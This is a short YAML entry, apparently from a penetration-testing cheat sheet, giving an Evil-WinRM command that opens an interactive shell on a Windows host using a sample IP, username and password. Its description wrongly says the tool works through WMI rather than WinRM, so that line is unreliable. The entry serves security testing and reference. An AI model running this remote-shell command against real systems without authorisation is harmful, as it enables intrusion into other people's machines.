---
title: |
  Interactive shell on windows host using WMI
description: |
  Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host.

  Command Reference:

  	Target IP: 10.10.10.1

  	Username: test

  	Password: Welkom01!

command: |
  evil-winrm -i 10.10.10.1 -u test -p Welkom01!
items:
  - Password
  - Username
services:
  - WMI
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/Hackplayers/evil-winrm
---
